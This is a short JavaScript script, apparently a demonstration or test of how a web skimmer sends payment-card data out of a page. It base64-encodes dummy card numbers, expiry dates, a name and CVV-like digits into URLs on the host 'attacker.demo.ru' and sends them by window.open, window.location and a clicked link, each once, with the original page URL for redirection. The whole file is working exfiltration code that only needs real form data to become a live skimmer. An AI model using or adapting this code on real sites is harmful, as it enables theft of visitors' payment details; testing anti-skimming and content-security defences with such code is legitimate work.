(async function(){
	
	const baseUrl = 'http://attacker.demo.ru/secret/'	

	function prepareUrl(payload, redirect = false) {
		let redirectUrl = 'none'
		if (redirect) redirectUrl = window.location.href
		let url = baseUrl + btoa(payload) + "/" + btoa(redirectUrl) 
		return url
	}

	function checkSendOnce(id) {
		let q = localStorage.getItem(id);
		if (q) return true
		localStorage.setItem(id, id);
		return false
	}

	function sendViaWindowOpen(payload) {		
		let url = prepareUrl(payload + ' ( via WindowOpen )', true)
		window.open(url,'_self')	
	}

	function sendViaWindowLocation(payload) {		
		let url = prepareUrl(payload + ' ( via WindowLocation )', true)
		window.location.href = url
	}
	
	function sendViaAhref(payload) {		
		let url = prepareUrl(payload + ' ( via Ahref )', true)
		const link = document.createElement('a')
		link.href = url
		document.body.appendChild(link)
		link.click()		
	}	
	
	
	if (!checkSendOnce('WindowOpen')) sendViaWindowOpen('5555666677778888_10/25_IvanIvanov_123');
	
	await new Promise(r => setTimeout(r, 2000));
	
	if (!checkSendOnce('WindowLocation')) sendViaWindowLocation('4444666677778888_10/25_IvanIvanov_123');
	
	await new Promise(r => setTimeout(r, 2000));
	
	if (!checkSendOnce('Ahref')) sendViaAhref('3333666677778888_10/25_IvanIvanov_123');
	
})();

